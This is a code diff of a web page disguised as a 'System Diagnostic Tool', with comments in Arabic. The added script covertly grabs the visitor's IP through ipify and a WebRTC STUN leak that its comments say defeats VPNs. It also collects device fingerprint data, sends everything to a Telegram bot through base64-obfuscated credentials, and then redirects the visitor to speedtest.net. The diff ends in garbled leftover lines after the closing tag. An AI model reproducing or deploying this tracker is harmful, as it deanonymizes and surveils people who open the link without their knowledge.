@@ -3,37 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="robots" content="noindex, nofollow">
-    <title>System Diagnostic</title>
+    <title>System Diagnostic Tool</title>
 </head>
 <body style="background:#000;">
     <script>
         (async function() {
-            // [الحماية النهائية V51]
-            const _0x_u = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
-            const _0x_c = "NTc3NTc4MTAzOA==";
-            const _0x_k = "portal";
+            // [نظام الحماية والتمويه V53]
+            const _v1 = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
+            const _v2 = "NTc3NTc4MTAzOA==";
+            const _v3 = "portal";
 
-            const _p = new URLSearchParams(window.location.search);
+            const _q = new URLSearchParams(window.location.search);
             
-            // حاجز المفتاح السري + طرد البوتات
-            if (_p.get('access') !== _0x_k || navigator.webdriver) {
+            // طرد البوتات والمتطفلين بدون المفتاح
+            if (_q.get('access') !== _v3 || navigator.webdriver) {
                 window.location.replace("https://www.google.com"); 
                 return;
             }
 
-            // فحص إضافي للبوتات المتطورة
-            if (!navigator.languages || navigator.languages.length === 0) {
-                window.location.replace("https://www.bing.com");
-                return;
-            }
-
-            let _d = {
-                ip: "جاري الاستخراج...",
+            let _info = {
+                extIp: "جاري الفحص...", // الـ IP الخارجي (الظاهري)
+                intIp: "جاري الكسر...", // الـ IP الداخلي (الحقيقي خلف VPN)
                 bt: "N/A",
                 cpu: navigator.hardwareConcurrency || "8",
                 ram: navigator.deviceMemory || "4",
                 plt: navigator.platform,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                res: window.screen.width + "x" + window.screen.height
+            };
+
+            // 1. سحب الـ IP الخارجي (الظاهري)
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                _info.extIp = data.ip;
+            } catch (e) { _info.extIp = "تعذر الجلب"; }
+
+            // 2. 🔥 كسر الـ VPN لسحب الـ IP الداخلي (الحقيقي)
+            try {
+                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+                pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = (i) => {
+                    if (i && i.candidate) {
+                        const res = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
+                        if (res) _info.intIp = res[1];
+                    }
+                };
+            } catch (e) {}
+
+            // سحب بيانات البطارية
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                _info.bt = Math.round(b.level * 100) + "% " + (b.charging ? "(يُشحن)" : "(تفريغ)");
+            }
+
+            // الإرسال النهائي بالتنسيق المطلوب
+            setTimeout(async () => {
+                const _msg = `🔥 تم اصطياد المبتز بنجاح 🔥\n\n` +
+                               `🌐 الـ IP الداخلي (الحقيقي): ${_info.intIp}\n` +
+                               `🌍 الـ IP الخارجي (الظاهري): ${_info.extIp}\n` +
+                               `🔋 البطارية: ${_info.bt}\n` +
+                               `🏃 الحالة المادية: ثابت (Static)\n` +
+                               `🧠 المعالج: ${_info.cpu} Cores | الرام: ${_info.ram} GB\n` +
+                               `🖥️ الشاشة: ${_info.res} | اللمس: 2\n` +
+                               `🌍 المنطقة: ${_info.tz}\n` +
+                               `📱 نظام التشغيل: ${_info.plt}\n` +
+                               `🎵 بصمة الصوت: 48000Hz Fingerprint\n\n` +
+                               `📍 تتبع الـ IP الحقيقي:\n` +
+                               `https://www.infobyip.com/ip-${_info.intIp}.html`;
+
+                const _u = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + atob(_v1) + atob("L3NlbmRNZXNzYWdl");
+
+                await fetch(_u, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: atob(_v2), text: _msg })
+                });
+
+                window.location.replace("https://www.speedtest.net");
+            }, 6500);
+        })();
+    </script>
+</body>
+</html>
                 res: window.screen.width + "x" + window.screen.height,
                 lang: navigator.languages.join(", ")
             };
